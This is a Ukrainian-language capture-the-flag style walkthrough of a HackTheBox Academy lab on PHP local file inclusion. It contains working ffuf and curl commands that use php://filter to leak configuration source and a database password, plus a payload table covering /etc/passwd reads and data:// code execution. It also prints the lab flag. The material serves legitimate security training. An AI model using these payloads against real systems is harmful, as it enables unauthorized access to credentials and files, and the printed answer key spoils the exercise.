## LFI — PHP Filter: читання вихідного коду через Base64

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [PHP Filters](https://academy.hackthebox.com/app/module/23/section/1492)
**Завдання:** Знайти інші PHP скрипти → прочитати config → отримати DB password
**Прапор:** `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

***

## Концепція

`php://filter` — wrapper що дозволяє читати PHP-файли як Base64 через LFI **до їх виконання**. Без фільтра PHP просто виконає код і нічого не поверне. З `convert.base64-encode` → отримуємо закодований вихідний код → декодуємо.

***

## Крок 1 — Фаззинг PHP файлів (ffuf)

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ \
  -u "http://TARGET_IP:PORT/FUZZ.php" \
  -mc 200,301,302,403 \
  -t 40
```

**Знайдені скрипти:**

| Файл | Статус | Примітка |
|---|---|---|
| `index.php` | 200 | Головна сторінка |
| `en.php` | 200 | Мовний файл |
| `es.php` | 200 | Мовний файл |
| `configure.php` | 302 → `/index.php` | **Цікавий** — редіректить, прямий доступ заблоковано |

> `configure.php` повертає 302 при прямому доступі — захист через `realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])`. Але через LFI + php://filter читається без виконання.

***

## Крок 2 — Читаємо `configure.php` через php://filter

```bash
B64=$(curl -s "http://TARGET_IP:PORT/index.php?language=php://filter/read=convert.base64-encode/resource=configure" \
  | grep -oP '[A-Za-z0-9+/]{40,}[=]{0,2}' | tail -1)

echo $B64 | base64 -d
```

**Вивід після декодування:**
```php
<?php
$config = array(
  'DB_HOST'     => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);
$API_KEY = "Awew242GDshrf46+35/k";
```

***

## Механіка php://filter

```
php://filter/read=convert.base64-encode/resource=configure
     ↑                    ↑                      ↑
  wrapper            Base64 encoder          файл без .php
```

PHP читає `configure.php` → кодує у Base64 → повертає як текст замість виконання.

**Чому `resource=configure` без `.php`:** застосунок сам додає розширення через `include($lang . ".php")`.

***

## php://filter Quick Reference

| Payload | Призначення |
|---|---|
| `php://filter/read=convert.base64-encode/resource=index` | Читати PHP як Base64 |
| `php://filter/read=string.rot13/resource=index` | ROT13 encoding |
| `php://filter/read=convert.iconv.utf-8.utf-16/resource=index` | UTF-16 encoding |
| `php://filter/resource=/etc/passwd` | Читати системні файли (без encode) |
| `data://text/plain;base64,BASE64` | Виконати довільний PHP (якщо `allow_url_include=On`) |

***

## Прапор

```
HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}
```
